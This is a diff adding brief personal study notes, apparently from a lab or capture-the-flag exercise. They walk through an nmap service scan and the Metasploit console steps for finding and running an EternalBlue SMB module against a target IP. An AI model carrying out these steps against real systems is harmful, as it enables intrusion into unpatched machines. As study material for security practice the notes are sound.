@@ -1,0 +1,14 @@
+nmap -sS -sV ip
+in metasploit
+write: search eternalblue
+use auxiliary/scanner/smb....
+show options
+RHOSTS is empty
+should be the ip of the target
+set RHOSTS ip
+exploit
+search eternalblue
+use (command)
+info 
+back (to return)
+
